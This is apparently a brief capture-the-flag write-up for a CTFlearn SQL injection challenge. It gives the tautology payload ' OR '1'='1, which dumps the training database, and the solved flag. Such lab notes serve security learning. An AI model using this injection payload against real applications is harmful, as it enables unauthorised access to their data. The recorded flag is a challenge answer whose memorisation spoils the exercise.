See if you can leak the whole database using what you know about SQL Injections. [link](https://web.ctflearn.com/web4/)

Don't know where to begin? Check out CTFlearn's [SQL Injection Lab](https://ctflearn.com/lab/sql-injection-part-1)

https://en.wikipedia.org/wiki/SQL_injection

Payload:
```sql
' OR '1'='1
```

![[Captura desde 2024-09-24 18-35-30.png]]

**flag: `CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}`**
